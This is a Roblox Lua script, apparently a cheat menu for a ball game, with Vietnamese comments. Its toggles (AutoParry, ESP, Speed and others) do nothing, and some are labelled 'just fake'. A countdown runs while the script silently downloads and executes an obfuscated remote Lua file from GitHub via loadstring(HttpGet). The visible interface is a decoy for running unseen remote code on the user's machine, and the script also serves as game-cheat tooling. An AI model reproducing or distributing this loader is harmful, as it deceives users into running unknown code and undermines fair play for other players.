-- Gui + Remote Script + Countdown thông báo
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local old = playerGui:FindFirstChild("rutoairas")
if old then old:Destroy() end

-- Tạo GUI chính
local screenGui = Instance.new("ScreenGui", playerGui)
screenGui.Name = "rutoairas"

local outer = Instance.new("Frame", screenGui)
outer.Size = UDim2.new(0, 420, 0, 450) -- Tăng chiều cao chứa thông báo
outer.Position = UDim2.new(0.5, -210, 0.5, -225)
outer.BackgroundColor3 = Color3.new(0, 0, 0)
outer.BorderSizePixel = 2
outer.BorderColor3 = Color3.new(1, 0, 0)
Instance.new("UICorner", outer).CornerRadius = UDim.new(0, 15)

local main = Instance.new("Frame", outer)
main.Size = UDim2.new(1, -20, 1, -20)
main.Position = UDim2.new(0, 10, 0, 10)
main.BackgroundColor3 = Color3.new(0, 0, 0)
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)

-- Header
local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "rutoairas"
title.TextColor3 = Color3.new(1, 0, 0)
title.Font = Enum.Font.GothamBold
title.TextSize = 20

-- Close button
local closeBtn = Instance.new("TextButton", main)
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -30, 0, 0)
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.new(1, 0, 0)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 20
closeBtn.BackgroundColor3 = Color3.new(0.16, 0, 0)
closeBtn.MouseButton1Click:Connect(function()
    screenGui.Enabled = false
end)

-- Hide/Show toggle
local hideBtn = Instance.new("TextButton", screenGui)
hideBtn.Size = UDim2.new(0, 50, 0, 30)
hideBtn.Position = UDim2.new(0, 5, 0, 5)
hideBtn.Text = "Hide"
hideBtn.TextColor3 = Color3.new(1, 0, 0)
hideBtn.Font = Enum.Font.GothamBold
hideBtn.TextSize = 18
hideBtn.BackgroundColor3 = Color3.new(0.16, 0, 0)

local visible = true
hideBtn.MouseButton1Click:Connect(function()
    visible = not visible
    outer.Visible = visible
    hideBtn.Text = visible and "Hide" or "Show"
end)

-- Side menu
local menu = Instance.new("Frame", main)
menu.Size = UDim2.new(0, 100, 1, -30)
menu.Position = UDim2.new(0, 0, 0, 30)
menu.BackgroundColor3 = Color3.new(0.06, 0.06, 0.06)

local function makeMenuBtn(text, posY)
    local btn = Instance.new("TextButton", menu)
    btn.Size = UDim2.new(1, 0, 0, 40)
    btn.Position = UDim2.new(0, 0, 0, posY)
    btn.Text = text
    btn.TextColor3 = Color3.new(1, 0, 0)
    btn.Font = Enum.Font.GothamSemibold
    btn.TextSize = 18
    btn.BackgroundColor3 = Color3.new(0.1, 0, 0)
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
    return btn
end

local btnMain = makeMenuBtn("Main", 0)
local btnPlayer = makeMenuBtn("Player", 40)
-- (Auto Buy, Settings can be added similarly)

-- Content frame
local content = Instance.new("Frame", main)
content.Size = UDim2.new(1, -100, 1, -60)
content.Position = UDim2.new(0, 100, 0, 30)
content.BackgroundColor3 = Color3.new(0.05, 0.05, 0.05)

local tabTitle = Instance.new("TextLabel", content)
tabTitle.Size = UDim2.new(1, 0, 0, 30)
tabTitle.Position = UDim2.new(0, 0, 0, 0)
tabTitle.BackgroundTransparency = 1
tabTitle.TextColor3 = Color3.new(1, 0, 0)
tabTitle.Font = Enum.Font.GothamBold
tabTitle.TextSize = 24
tabTitle.TextXAlignment = Enum.TextXAlignment.Left

-- Dropdown toggle generator
local function createToggle(text, posY, fakeNote)
    local frame = Instance.new("Frame", content)
    frame.Size = UDim2.new(1, -20, 0, fakeNote and 60 or 40)
    frame.Position = UDim2.new(0, 10, 0, posY)
    frame.BackgroundTransparency = 1

    local label = Instance.new("TextLabel", frame)
    label.Size = UDim2.new(1, -60, 0, 20)
    label.Position = UDim2.new(0, 0, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextColor3 = Color3.new(1, 0, 0)
    label.Font = Enum.Font.GothamSemibold
    label.TextSize = 18
    label.TextXAlignment = Enum.TextXAlignment.Left

    if fakeNote then
        local note = Instance.new("TextLabel", frame)
        note.Size = UDim2.new(1, -60, 0, 20)
        note.Position = UDim2.new(0, 0, 0, 22)
        note.BackgroundTransparency = 1
        note.Text = "Chỉ là ảo"
        note.TextColor3 = Color3.new(1, 0.2, 0.2)
        note.Font = Enum.Font.GothamItalic
        note.TextSize = 14
        note.TextXAlignment = Enum.TextXAlignment.Left
    end

    local toggle = Instance.new("Frame", frame)
    toggle.Size = UDim2.new(0, 40, 0, 20)
    toggle.Position = UDim2.new(1, -50, 0, 10)
    toggle.BackgroundColor3 = Color3.new(0.31, 0, 0)
    toggle.ClipsDescendants = true
    Instance.new("UICorner", toggle).CornerRadius = UDim.new(1, 0)

    local circle = Instance.new("Frame", toggle)
    circle.Size = UDim2.new(0, 18, 0, 18)
    circle.Position = UDim2.new(0, 1, 0, 1)
    circle.BackgroundColor3 = Color3.new(0, 0, 0)
    Instance.new("UICorner", circle).CornerRadius = UDim.new(1, 0)

    local enabled = false
    local btn = Instance.new("TextButton", toggle)
    btn.Size = UDim2.new(1, 0, 1, 0)
    btn.BackgroundTransparency = 1
    btn.MouseButton1Click:Connect(function()
        enabled = not enabled
        if enabled then
            toggle.BackgroundColor3 = Color3.new(1, 0, 0)
            circle:TweenPosition(UDim2.new(0.5, 20, 0, 1), Enum.EasingDirection.InOut, Enum.EasingStyle.Quad, 0.2, true)
        else
            toggle.BackgroundColor3 = Color3.new(0.31, 0, 0)
            circle:TweenPosition(UDim2.new(0, 1, 0, 1), Enum.EasingDirection.InOut, Enum.EasingStyle.Quad, 0.2, true)
        end
    end)
end

-- Tab handlers
local function clearContent()
    for _,c in ipairs(content:GetChildren()) do
        if c ~= tabTitle then c:Destroy() end
    end
end

local function loadMainTab()
    tabTitle.Text = "Main"
    clearContent()
    local y = 50
    for _, name in ipairs({"Spam Click V2","Spam Click Mobile","Auto Spam Bata","AutoParry"}) do
        createToggle(name, y, false)
        y += 50
    end
end

local function loadPlayerTab()
    tabTitle.Text = "Player"
    clearContent()
    local y = 50
    for _, name in ipairs({"ESP PLAYER","ESP BALL","SPEED","JUMP"}) do
        createToggle(name, y, true)
        y += 70
    end
end

btnMain.MouseButton1Click:Connect(loadMainTab)
btnPlayer.MouseButton1Click:Connect(loadPlayerTab)
loadMainTab()

-- Dòng thông báo phía dưới GUI
local notif = Instance.new("TextLabel", outer)
notif.Size = UDim2.new(1, -20, 0, 30)
notif.Position = UDim2.new(0, 10, 1, -35)
notif.BackgroundTransparency = 0.5
notif.BackgroundColor3 = Color3.new(0, 0, 0)
notif.TextColor3 = Color3.new(1, 0, 0)
notif.Font = Enum.Font.GothamBold
notif.TextSize = 16
notif.Text = "⏳ Initializing..."
Instance.new("UICorner", notif).CornerRadius = UDim.new(0, 6)

-- Countdown timer (170 seconds)
spawn(function()
    local t = 170
    while t >= 0 do
        notif.Text = (t > 0) and ("⏳ Please wait: " .. t .. "s") or "✅ Ready!"
        t -= 1
        wait(1)
    end
end)

-- Load remote script safely
spawn(function()
    local ok, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptjame/V3/refs/heads/main/Protected_6526372975604984.lua"))()
    end)
    if not ok then
        warn("Error loading remote script:", err)
    end
end)
